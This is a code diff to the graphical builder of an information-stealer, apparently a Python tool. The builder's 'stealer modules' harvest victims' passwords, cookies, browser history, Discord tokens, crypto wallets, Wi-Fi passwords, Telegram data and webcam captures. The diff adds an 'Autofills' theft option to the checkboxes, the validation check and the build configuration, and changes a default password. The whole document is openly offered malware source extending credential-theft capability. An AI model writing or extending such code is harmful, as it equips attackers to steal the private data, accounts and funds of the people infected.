@@ -23,7 +23,7 @@ from threading import Thread
 
 class Settings:
 	UpdatesCheck = True
-	Password = "blank"
+	Password = "blank123"
 
 class Utility:
 
@@ -128,6 +128,7 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 		self.capturePasswordsVar = ctk.BooleanVar(self)
 		self.captureCookiesVar = ctk.BooleanVar(self)
 		self.captureHistoryVar = ctk.BooleanVar(self)
+		self.captureAutofillsVar = ctk.BooleanVar(self)
 		self.captureDiscordTokensVar = ctk.BooleanVar(self)
 		self.captureGamesVar = ctk.BooleanVar(self)
 		self.captureWifiPasswordsVar = ctk.BooleanVar(self)
@@ -184,6 +185,9 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 
 		self.captureHistoryCheckboxControl = ctk.CTkCheckBox(self, text= "History", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "cyan", text_color_disabled= "grey", variable= self.captureHistoryVar)
 		self.captureHistoryCheckboxControl.grid(row= 4, column= 1, sticky= "w", padx= 20)
+
+		self.captureHistoryCheckboxControl = ctk.CTkCheckBox(self, text= "Autofills", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "cyan", text_color_disabled= "grey", variable= self.captureAutofillsVar)
+		self.captureHistoryCheckboxControl.grid(row= 5, column= 1, sticky= "w", padx= 20)
 
 		self.captureDiscordTokensCheckboxControl = ctk.CTkCheckBox(self, text= "Discord Tokens", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "cyan", text_color_disabled= "grey", variable= self.captureDiscordTokensVar)
 		self.captureDiscordTokensCheckboxControl.grid(row= 1, column= 2, sticky= "w", padx= 20)
@@ -418,7 +422,13 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 			messagebox.showwarning("Warning", "Unable to connect to the internet!")
 			return
 		
-		if not any([self.captureWebcamVar.get(), self.capturePasswordsVar.get(), self.captureCookiesVar.get(), self.captureHistoryVar.get(), self.captureDiscordTokensVar.get(), self.captureGamesVar.get(), self.captureWalletsVar.get(), self.captureWifiPasswordsVar.get(), self.captureSystemInfoVar.get(), self.captureScreenshotVar.get(), self.captureTelegramVar.get(), self.captureCommonFilesVar.get()]):
+		if not any([
+			self.captureWebcamVar.get(), self.capturePasswordsVar.get(), self.captureCookiesVar.get(), 
+	      	self.captureHistoryVar.get(), self.captureDiscordTokensVar.get(), self.captureGamesVar.get(), 
+			self.captureWalletsVar.get(), self.captureWifiPasswordsVar.get(), self.captureSystemInfoVar.get(), 
+			self.captureScreenshotVar.get(), self.captureTelegramVar.get(), self.captureCommonFilesVar.get(),
+			self.captureAutofillsVar.get(),
+			]):
 			messagebox.showwarning("Warning", "You must select at least one of the stealer modules!")
 			return
 		
@@ -442,6 +452,7 @@ class BuilderOptionsFrame(ctk.CTkFrame):
         		"capturePasswords" : self.capturePasswordsVar.get(),
         		"captureCookies" : self.captureCookiesVar.get(),
         		"captureHistory" : self.captureHistoryVar.get(),
+				"captureAutofills" : self.captureAutofillsVar.get(),
         		"captureDiscordTokens" : self.captureDiscordTokensVar.get(),
 				"captureGames" : self.captureGamesVar.get(),
         		"captureWifiPasswords" : self.captureWifiPasswordsVar.get(),
